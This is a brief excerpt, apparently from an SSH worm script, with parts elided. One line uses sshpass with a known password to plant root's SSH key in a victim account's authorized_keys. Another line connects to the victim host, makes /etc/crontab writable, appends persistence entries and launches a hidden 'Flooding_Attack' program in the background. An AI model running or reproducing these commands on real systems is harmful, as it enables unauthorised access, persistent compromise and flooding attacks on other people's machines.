...
(echo "victim\r")|sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
#####
...
ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; sudo chmod +w /etc/crontab; echo "$(cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab; cd "$Hidden2" && ./Flooding_Attack > /dev/null 2>&1'
